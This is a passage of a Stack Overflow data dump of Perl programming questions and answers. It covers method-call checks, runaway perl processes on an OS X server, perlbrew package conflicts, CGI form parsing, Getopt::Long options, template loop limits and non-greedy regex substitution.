"title": "Seek Perl idiom to check that $self is a class or object", "body": "<p>In Perl, I just got bitten by something that looked like the bug below:</p>\n\n<pre><code>package Foo;\nsub method {\n    my $self = shift;\n    my @args = @_;\n    ...\n}\n</code></pre>\n\n<p>where I called it as a subroutine, not a method:</p>\n\n<pre><code>Foo::method( \"arg1\", \"arg2\" );\n</code></pre>\n\n<p>rather than calling it as a method - in this case, it was a \"class method\":</p>\n\n<pre><code>Foo-&gt;method( \"arg1\", \"arg2\" );\n</code></pre>\n\n<p>Calling Foo::method(\"arg1\",\"arg2\")  resulted in \"arg1\" getting dropped.</p>\n\n<p>Similar considerations can arise with an \"object method\":</p>\n\n<pre><code>my $object = Foo-&gt;new();\n$obj-&gt;method( \"arg1\", \"arg2\" );\n</code></pre>\n\n<p>Is there a friendly, concise, Perl idiom for checking that the first argument, conventionally called <code>$self</code>, is in fact an object in the class (package), and/or the class/package name?</p>\n\n<p>The best I have come up with is:</p>\n\n<pre><code>package Foo;\nsub method {\n    my $self = ($_[0]-&gt;isa(__PACKAGE__) ? shift @_ : die \"...error message...\";\n    my @args = @_;\n    ...\n}\n</code></pre>\n\n<p>which is not much more concise than </p>\n\n<pre><code>package Foo;\nsub method {\n    my $self = shift;\n    die \"...error message...\"  if $self-&gt;isa(__PACKAGE__);\n    my @args = @_;\n    ...\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>package Foo;\nuse Carp::Assert;\nsub method {\n    my $self = shift;\n    assert($self-&gt;isa(__PACKAGE__));\n    my @args = @_;\n    ...\n}\n</code></pre>\n\n<hr>\n\n<p>Notes:</p>\n\n<p>I know about Perl signatures, but dislike using experimental features.</p>\n\n<p>I know about <a href=\"http://perldoc.perl.org/attributes.html\" rel=\"nofollow noreferrer\"><code>use attributes</code> and <code>:method</code></a>.   Is that the best way to go?   Similar concerns about \"evolving\" features.</p>\n\n<p>I know about Moose - but I don't think that Moose enforces this.  (Did I miss anything.)</p>\n\n<p>The problem with Perl is that there are so many ways to do something.</p>\n"}, {"tags": ["macos", "apache", "perl", "server"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1454959606, "post_id": 35277607, "comment_id": 58266768, "body": "&quot;How can I kill all Perl processes at one time?&quot; <code>killall perl</code> (not sure if this is available on OS X, though)"}, {"owner": {"reputation": 1, "user_id": 5079999, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153455655647888/picture?type=large", "display_name": "Andreas Carlsson", "link": "https://stackoverflow.com/users/5079999/andreas-carlsson"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454961711, "post_id": 35277607, "comment_id": 58268009, "body": "Thanks, I can&#39;t get it to work though: bash-3.2# killall perl No matching processes were found   bash-3.2# killall perl*   No matching processes were found   bash-3.2# killall perl5.10.0    No matching processes were found bash-3.2# killall &quot;perl5.10.0&quot; No matching processes were found bash-3.2#  ...?"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 5079999, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153455655647888/picture?type=large", "display_name": "Andreas Carlsson", "link": "https://stackoverflow.com/users/5079999/andreas-carlsson"}, "edited": false, "score": 0, "creation_date": 1455009347, "post_id": 35279908, "comment_id": 58286165, "body": "Did not work. No errors, but all perl processes is still alive. Thanks anyway."}], "tags": [], "owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "is_accepted": false, "score": 0, "last_activity_date": 1454972674, "last_edit_date": 1454972674, "creation_date": 1454967738, "answer_id": 35279908, "question_id": 35277607, "link": "https://stackoverflow.com/questions/35277607/os-x-server-10-6-8-keeps-crashing/35279908#35279908", "title": "OS X Server 10.6.8 keeps crashing", "body": "<p>How can you kill all Perl processes at one time?  <code>killall</code> is available on OS X.  Try</p>\n\n<pre><code>killall -9 perl\n</code></pre>\n\n<p>HTH</p>\n\n<p>btw - my apologies to ThisSuitIsBlackNot -- I see he referred to this in his comments.</p>\n"}], "owner": {"reputation": 1, "user_id": 5079999, "user_type": "registered", "profile_image": "https://graph.facebook.com/10153455655647888/picture?type=large", "display_name": "Andreas Carlsson", "link": "https://stackoverflow.com/users/5079999/andreas-carlsson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 87, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1454972674, "creation_date": 1454959363, "question_id": 35277607, "link": "https://stackoverflow.com/questions/35277607/os-x-server-10-6-8-keeps-crashing", "title": "OS X Server 10.6.8 keeps crashing", "body": "<p>I have an OS X Server 10.4 that started Kernel Panicking on me late december. It had Mail, Web and SQL services turned on.<br>\nI switched to another Mac, problem persisted. Updated to 10.6.8, no difference. Switched to a third Mac, no difference.<br>\nIn short; It gets 1-3 Kernel Panics per day. </p>\n\n<p>I have noticed that the CPU load slowly rises until it panics.   </p>\n\n<p>So during this weekend I turned off all services except Mail. It worked very good during the weekend. Today 1500 (15pm) I turned on Web services, and after that the CPU load started to rise...</p>\n\n<p>Among the processes I found more than 300 perl processes owned by the _www user. As well as the clamavd (owned by amisvd if I remember correctly) eating a lot of memory.  </p>\n\n<p>Clamavd is the anti virus and spam processes, right? I have tried to turn them off in the OS X Server admin app. It won't turn off.\nRegarding the Perl processes I really don't know where that is used. The info panel doesn't give me any idea. I think it means that one of the sites (I have about 20) is using perl, but I don't know which one.</p>\n\n<p>So, some questions:<br>\n- Is it safe to upgrade to OS X El Capitan Server? Should I?<br>\n- How can I kill all Perl processes at one time? (I have googled this but couldn't find any working tips)<br>\n- Any idea of what's going on?</p>\n\n<p>As you may tell I'm not very skilled with Apache, but I still think it's funny and educating to do this.</p>\n\n<p><a href=\"http://i.stack.imgur.com/JqgFc.png\" rel=\"nofollow\">Graph</a><br>\n<a href=\"http://i.stack.imgur.com/wcscI.png\" rel=\"nofollow\">Perl processes</a></p>\n"}, {"tags": ["linux", "perl", "console", "rxvt"], "comments": [{"owner": {"reputation": 5641, "user_id": 1726507, "user_type": "registered", "accept_rate": 31, "profile_image": "https://www.gravatar.com/avatar/7b7cd4fbecd030677b7c29c99d29d1ca?s=128&d=identicon&r=PG", "display_name": "Sonique", "link": "https://stackoverflow.com/users/1726507/sonique"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454956494, "post_id": 35276758, "comment_id": 58265056, "body": "But rxvt and surf is not Perl modules, it&#39;s apps from repos. And when I try to dpkg -i this apps I cant, because they use system Perl 5.18 :("}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1454960111, "last_edit_date": 1454960111, "creation_date": 1454958736, "answer_id": 35277423, "question_id": 35276758, "link": "https://stackoverflow.com/questions/35276758/how-to-use-brewperl-for-installing-applications-on-ubuntu/35277423#35277423", "title": "How to use brewperl for installing applications on Ubuntu", "body": "<blockquote>\n  <p><em>for new versions of <code>rxvt</code> and <code>surf</code> I need Perl v5.20+.</em></p>\n</blockquote>\n\n<p>That's not true.</p>\n\n<p><code>rxvt</code> 2.7.10 uses <a href=\"http://sourceforge.net/p/rxvt/code/HEAD/tree/tags/rxvt-2-7-10/W11/wrap/mkproxy.pl\" rel=\"nofollow\">a Perl script</a> will work even with 15 year-old 5.6.</p>\n\n<p><code>surf</code> 1.0.6 doesn't use Perl at all (assuming you mean <a href=\"http://sourceforge.net/projects/surf/\" rel=\"nofollow\">this project</a>).</p>\n\n<p>Were you to try to install these from source, it wouldn't matter at all what Perl you had available.</p>\n\n<p>Instead, you appear to be trying to install packages built for a system other than yours. To install <em>the <code>rxvt</code> and <code>surf</code> packages you have</em>, you need to have version 5.20 of <em>the distributor's <code>perl</code> package</em>. No matter how many version of <code>perl</code> you install, you'll never satisfy that requirement.</p>\n\n<p>You can't install those packages. You'll need packages appropriate for your system, or you'll need to install the libraries from source.</p>\n"}], "owner": {"reputation": 5641, "user_id": 1726507, "user_type": "registered", "accept_rate": 31, "profile_image": "https://www.gravatar.com/avatar/7b7cd4fbecd030677b7c29c99d29d1ca?s=128&d=identicon&r=PG", "display_name": "Sonique", "link": "https://stackoverflow.com/users/1726507/sonique"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1454965435, "creation_date": 1454956310, "last_edit_date": 1454965435, "question_id": 35276758, "link": "https://stackoverflow.com/questions/35276758/how-to-use-brewperl-for-installing-applications-on-ubuntu", "title": "How to use brewperl for installing applications on Ubuntu", "body": "<p>I am use <code>Ubuntu 14.04 LTS</code> with <code>Perl 5 (v5.18.2)</code>, but for new versions of <code>rxvt</code> and <code>surf</code> I need <code>Perl v5.20+</code>.</p>\n\n<p>As solution I found perlbrew and install <code>Perl v5.20</code>, found .deb with rxvt, but anyway cannot install, because it use system Perl.</p>\n\n<p>My question is how to install applications on Linux with Perl dependency and do not break internal compatibility of Linux Core?</p>\n"}, {"tags": ["forms", "perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1454956215, "post_id": 35276573, "comment_id": 58264884, "body": "That means that <code>$ENV{ &quot;CONTENT_LENGTH&quot; }</code> is undefined. Any reason to believe it shouldn&#39;t be? /// Why reinvent the wheel (so extremely poorly)? Use the CGI module or something!!!"}, {"owner": {"reputation": 1251, "user_id": 1389528, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a7abc0238d7064610e1bcf20feeb6cef?s=128&d=identicon&r=PG", "display_name": "Xi Vix", "link": "https://stackoverflow.com/users/1389528/xi-vix"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454957765, "post_id": 35276573, "comment_id": 58265722, "body": "You&#39;re right ... I am no longer able to pass form data to programs in cgi-bin ... so I have another problem somewhere."}], "owner": {"reputation": 1251, "user_id": 1389528, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a7abc0238d7064610e1bcf20feeb6cef?s=128&d=identicon&r=PG", "display_name": "Xi Vix", "link": "https://stackoverflow.com/users/1389528/xi-vix"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 52, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1454956098, "creation_date": 1454955742, "last_edit_date": 1454956098, "question_id": 35276573, "link": "https://stackoverflow.com/questions/35276573/perl-routing-to-get-form-values-stopped-working", "title": "perl routing to get form values stopped working", "body": "<p>I use some routines to get form data from a web form.<br>\nThe program lives in /var/www/cgi-bin on a linux server.<br>\nI went from perl 5.10.1 to 5.22.1 and now the code below stopped working.<br>\nIt gives me this error:<br>\nUse of uninitialized value in read for the third line from the top.<br>\nI can't figure out the problem.</p>\n\n<pre><code>sub populatePostFields {\n %postFields = ();\n read( STDIN, $tmpStr, $ENV{ \"CONTENT_LENGTH\" } );\n @parts = split( /\\&amp;/, $tmpStr );\n foreach $part (@parts) {\n  ( $name, $value ) = split( /\\=/, $part );\n  $value =~ ( s/%23/\\#/g );\n  $value =~ ( s/%2F/\\//g );\n  $postFields{ \"$name\" } = $value;\n }\n}\n\nsub populateQueryFields {\n%queryString = ();\nmy $tmpStr = $ENV{ \"QUERY_STRING\" };\n@parts = split( /\\&amp;/, $tmpStr );\nforeach $part (@parts) {\n( $name, $value ) = split( /\\=/, $part );\n$queryString{ \"$name\" } = $value;\n}\n}\n\npopulatePostFields();\n$strCode = $postFields{ \"code\" };\n$strMode = $postFields{ \"mode\" };\n$strUser = $postFields{ \"loginName\" };\n\nif ($strCode ne \"secretcode\") {\n populateQueryFields();\n $strCode = $queryString{ \"code\" };\n $strMode = $queryString{ \"mode\" };\n $strUser = $queryString{ \"loginName\" };\n}\n</code></pre>\n\n<p>Any help is appreciated.  Thanks in advance.</p>\n"}, {"tags": ["perl", "options", "getopt-long"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1454951914, "post_id": 35275421, "comment_id": 58262479, "body": "See &quot;Options with values&quot; in the <a href=\"http://perldoc.perl.org/Getopt/Long.html#Options-with-values\" rel=\"nofollow noreferrer\">documentation</a>."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 5880064, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/611085c55231d10a276f7a92db7390c8?s=128&d=identicon&r=PG&f=1", "display_name": "jsks", "link": "https://stackoverflow.com/users/5880064/jsks"}, "edited": false, "score": 0, "creation_date": 1454954590, "post_id": 35275688, "comment_id": 58264032, "body": "Thanks..that helps..thought it is a value assignment instead of data type."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1454952527, "creation_date": 1454952527, "answer_id": 35275688, "question_id": 35275421, "link": "https://stackoverflow.com/questions/35275421/perl-getoptlong-output-issue/35275688#35275688", "title": "perl Getopt::Long output issue", "body": "<p>The following indicates a argument-less option:</p>\n\n<pre><code>\"file\" =&gt; \\$file\n</code></pre>\n\n<p>To accept a string argument, use the following:</p>\n\n<pre><code>\"file=s\" =&gt; \\$file\n</code></pre>\n\n<p><a href=\"http://search.cpan.org/perldoc?Getopt::Long#Summary_of_Option_Specifications\" rel=\"nofollow\">Option Specifications</a></p>\n"}], "owner": {"reputation": 31, "user_id": 5880064, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/611085c55231d10a276f7a92db7390c8?s=128&d=identicon&r=PG&f=1", "display_name": "jsks", "link": "https://stackoverflow.com/users/5880064/jsks"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1454952633, "creation_date": 1454951708, "last_edit_date": 1454952633, "question_id": 35275421, "link": "https://stackoverflow.com/questions/35275421/perl-getoptlong-output-issue", "title": "perl Getopt::Long output issue", "body": "<p>Testing the Getopt::Long perl and when executed with arguments to options print command output is 1 instead supplied argument.</p>\n\n<p>Here is the code..Could not locate what is missing here.</p>\n\n<pre><code>#!c:\\Perl\\bin\nuse Getopt::Long;\n\n(@ARGV) or die \"$0 --file &lt;file name&gt; --cb &lt;CBEntry&gt;\";\n\nGetOptions( \"file\" =&gt; \\$file,\n            \"cb\" =&gt; \\$cb) or die \"$0 --file &lt;file name&gt; --cb &lt;CBEntry&gt; :$! \\n\";\n\n#print @ARGV;\nprint $file;\nprint $cb;\n</code></pre>\n"}, {"tags": ["html", "perl", "loops"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1454951378, "post_id": 35275119, "comment_id": 58262127, "body": "Are you using <a href=\"https://metacpan.org/pod/HTML::Template\" rel=\"nofollow noreferrer\">HTML::Template</a>? It might be useful to add an example template to your question to show exactly what you&#39;re trying to do."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 3272, "user_id": 2509472, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/6d5F9.jpg?s=128&g=1", "display_name": "Pbk1303", "link": "https://stackoverflow.com/users/2509472/pbk1303"}, "edited": false, "score": 0, "creation_date": 1454955747, "post_id": 35275119, "comment_id": 58264623, "body": "@Pbk1303 Adding inline code formatting to words and phrases that aren&#39;t code (like &quot;set a counter&quot; and &quot;tmpl loop after 10000 iterations&quot;) is not an improvement. Neither is adding bold to random words (like &quot;html templates&quot;). Please stop making edits like this."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455011937, "post_id": 35275119, "comment_id": 58287880, "body": "Please confirm which template module you&#39;re using to get relevant answers <i>&quot;html templates&quot;</i> isn&#39;t definitive, and a couple of people have suggested what module you may be using"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1454955911, "last_edit_date": 1454955911, "creation_date": 1454951485, "answer_id": 35275337, "question_id": 35275119, "link": "https://stackoverflow.com/questions/35275119/how-to-exit-a-tmpl-loop-in-perl/35275337#35275337", "title": "How to exit a tmpl loop in perl?", "body": "<p>Trim the data before sending it to the template in the first place.</p>\n\n<p>For example, change</p>\n\n<pre><code> $template-&gt;param(ROWS =&gt; \\@rows);\n</code></pre>\n\n<p>to</p>\n\n<pre><code> splice(@rows, 10_000);\n $template-&gt;param(ROWS =&gt; \\@rows);\n</code></pre>\n\n<p>or</p>\n\n<pre><code> my @truncated_rows = @rows[0 .. $#rows &lt; 10_000 ? $#rows : 10_000];\n $template-&gt;param(ROWS =&gt; \\@truncated_rows);\n</code></pre>\n\n<p>The latter is non-destructive, so if you need the entire set of rows for another purpose later in the program, they will still be available. (It seems fishy to continue processing after the output is rendered, but an update to the question seems to indicate this is a requirement.)</p>\n"}, {"tags": [], "owner": {"reputation": 5099, "user_id": 406224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bc79fa6fa58e2a4f5e6c2f803cabc48?s=128&d=identicon&r=PG", "display_name": "oalders", "link": "https://stackoverflow.com/users/406224/oalders"}, "is_accepted": true, "score": 4, "last_activity_date": 1454953055, "creation_date": 1454953055, "answer_id": 35275853, "question_id": 35275119, "link": "https://stackoverflow.com/questions/35275119/how-to-exit-a-tmpl-loop-in-perl/35275853#35275853", "title": "How to exit a tmpl loop in perl?", "body": "<p>If you're using <a href=\"https://metacpan.org/pod/Template\" rel=\"nofollow\">Template::Toolkit</a>, you can use the special <code>loop</code> variable:</p>\n\n<pre><code>[% FOREACH match IN results %]\n    [% LAST IF loop.count &gt; 10000 %]\n[% END %]\n</code></pre>\n\n<p>Note that <code>BREAK</code> is also an alias for <code>LAST</code>.</p>\n"}], "owner": {"reputation": 75, "user_id": 5899487, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d2cd53075c6428044445276d00b76b7a?s=128&d=identicon&r=PG&f=1", "display_name": "Tobias J.", "link": "https://stackoverflow.com/users/5899487/tobias-j"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 174, "favorite_count": 0, "accepted_answer_id": 35275853, "answer_count": 2, "score": 0, "last_activity_date": 1454961169, "creation_date": 1454950880, "last_edit_date": 1454961169, "question_id": 35275119, "link": "https://stackoverflow.com/questions/35275119/how-to-exit-a-tmpl-loop-in-perl", "title": "How to exit a tmpl loop in perl?", "body": "<p>I use <strong>html templates</strong> in Perl to generate a dynamic website, my <code>Script1.pm</code> generates a table and sends it as tmpl_loop to the <code>template.tmpl</code> to show a table on the website.</p>\n\n<p>This works pretty well so far, but as the table gets bigger than about 100,000 rows, the whole browser starts to lag. </p>\n\n<p>Can I somehow set a counter to exit the tmpl loop after 10000 iterations?</p>\n\n<p>Just making the table smaller in the script doesn't work cause I need it completed for an export file.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "edited": false, "score": 1, "creation_date": 1454947729, "post_id": 35273803, "comment_id": 58259716, "body": "Not sure what you mean. Is the output above what you get, or what you want to get? Do you want the <code>a</code> to be capitalised or not?"}], "answers": [{"comments": [{"owner": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "edited": false, "score": 0, "creation_date": 1455011147, "post_id": 35273974, "comment_id": 58287306, "body": "This one obvs also worked - thank you for the submission"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 28015, "user_id": 63550, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/RIZKi.png?s=128&g=1", "display_name": "Peter Mortensen", "link": "https://stackoverflow.com/users/63550/peter-mortensen"}, "edited": false, "score": 0, "creation_date": 1606143809, "post_id": 35273974, "comment_id": 114864493, "body": "@Peter Mortensen, &quot;So you want to do X? Here&#39;s how!&quot; is a rhetorical construct, never an actual question. Whatever, no reason to revert. But no need to tell someone with 311k that SO isn&#39;t a forum. That was a bit patronising, eh? (Also not a question.)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 28015, "user_id": 63550, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/RIZKi.png?s=128&g=1", "display_name": "Peter Mortensen", "link": "https://stackoverflow.com/users/63550/peter-mortensen"}, "edited": false, "score": 0, "creation_date": 1606162532, "post_id": 35273974, "comment_id": 114873373, "body": "@Peter Mortensen, Actually, I did need to fix it. You actually changed the wording into an implied question while claiming to do the opposite. Fixed."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1606162354, "last_edit_date": 1606162354, "creation_date": 1454947401, "answer_id": 35273974, "question_id": 35273803, "link": "https://stackoverflow.com/questions/35273803/a-non-greedy-perl-regular-expression/35273974#35273974", "title": "A non-greedy Perl regular expression", "body": "<p>It sounds like you want to capitalize from <code>pat</code> to <code>th</code> except for instances of <code>a</code> surrounded by spaces. The easiest way is to uppercase the whole thing, and then fix any instances of <code>A</code> surrounded by spaces.</p>\n<pre><code>sub capitalize {\n    my $s = shift;\n    my $uc = uc($s);\n    $uc =~ s/ \\s \\K A (?=\\s) /a/xg;\n    return $uc;\n}\n\ns{ ( \\Q$f\\E .* \\Q$s\\E ) }{ capitalize($1) }xseg;\n</code></pre>\n<p>The downside is that will replacing any existing <code>A</code> surrounded by spaces with <code>a</code>. The following is more complicated, but it doesn't suffer from that problem:</p>\n<pre><code>sub capitalize {\n    my $s = shift;\n    my @parts = $s =~ m{ \\G ( \\s+ | \\S+ ) }xg;\n    for (@parts) {\n       $_ = uc($_) if $_ ne &quot;a&quot;;\n    }\n\n    return join('', @parts);\n}\n\ns{ ( \\Q$f\\E .* \\Q$s\\E ) }{ capitalize($1) }xseg;\n</code></pre>\n<hr />\n<p>The rest of the code can be simplified:</p>\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nsub capitalize { ... }\n\nmy $f = shift;\nmy $s = shift;\n\nwhile (&lt;&gt;) {\n    s{ ( \\Q$f\\E .* \\Q$s\\E ) }{ capitalize($1) }xseg;\n    print;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "edited": false, "score": 0, "creation_date": 1454951858, "post_id": 35274241, "comment_id": 58262448, "body": "I was on the right path - I was doing something like this previously - but it wouldn&#39;t work (was unaware of &quot;eg&quot;). So I gave up on it and went for more code :(!!!! Thanks for the help"}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "reply_to_user": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "edited": false, "score": 0, "creation_date": 1454952344, "post_id": 35274241, "comment_id": 58262750, "body": "<code>e</code> means &quot;evaluate the right hand part as an expression&quot;, rather than just a string. There are many more useful flags, you may want to check out <code>perlop</code> and <code>perlre</code> for details."}], "tags": [], "owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "is_accepted": false, "score": 0, "last_activity_date": 1606114745, "last_edit_date": 1606114745, "creation_date": 1454948187, "answer_id": 35274241, "question_id": 35273803, "link": "https://stackoverflow.com/questions/35273803/a-non-greedy-perl-regular-expression/35274241#35274241", "title": "A non-greedy Perl regular expression", "body": "<p>So, if you want to match each sequence that starts with <code>pat</code> and ends with <code>th</code>, non-greedily, and uppercase that sequence, you can simply use an expression on the right side of your substitution:</p>\n<pre><code>$line =~ s/($f.+?$s)/uc($1)/eg;\n</code></pre>\n<p>And that's it.</p>\n"}], "owner": {"reputation": 460, "user_id": 4782247, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/a44J6.jpg?s=128&g=1", "display_name": "imbatman", "link": "https://stackoverflow.com/users/4782247/imbatman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 260, "favorite_count": 0, "accepted_answer_id": 35273974, "answer_count": 2, "score": -2, "last_activity_date": 1606162354, "creation_date": 1454946975, "last_edit_date": 1606114620, "question_id": 35273803, "link": "https://stackoverflow.com/questions/35273803/a-non-greedy-perl-regular-expression", "title": "A non-greedy Perl regular expression", "body": "<p>I need to write a script which does the following:</p>\n<pre><code>$ cat testdata.txt\nthis is my file containing data\nfor checking pattern matching with a patt on the back!\nonly one line contains the p word.\n\n$ ./mygrep5 pat th testdata.txt\nthis is my file containing data\nfor checking PATTERN MATCHING WITH a PATT ON THe back!\nonly one line contains the p word.\n</code></pre>\n<p>I have been able to print the line which is amended with the &quot;a&quot; capitalized as well. I have no idea how to only take what is needed.</p>\n<p>I have been messing around (below is my script so far) and all I manage to return is the &quot;PATT ON TH&quot; part.</p>\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\nuse Data::Dump 'pp';\n\nmy ($f, $s, $t) = @ARGV;\nmy @output_lines;\n\nopen(my $fh, '&lt;', $t);\n\nwhile (my $line = &lt;$fh&gt;) {\n    if ($line =~ /$f/ &amp;&amp; $line =~ /$s/) {\n        $line =~ s/($f.+?$s)/$1/g;\n        my $sub_phrase = uc $1;\n        $line =~ s/$1/$sub_phrase/g;\n        print $line;\n    }\n    #else {\n    #       print $line;\n    #}\n}\n\nclose($fh);\n</code></pre>\n<p>which 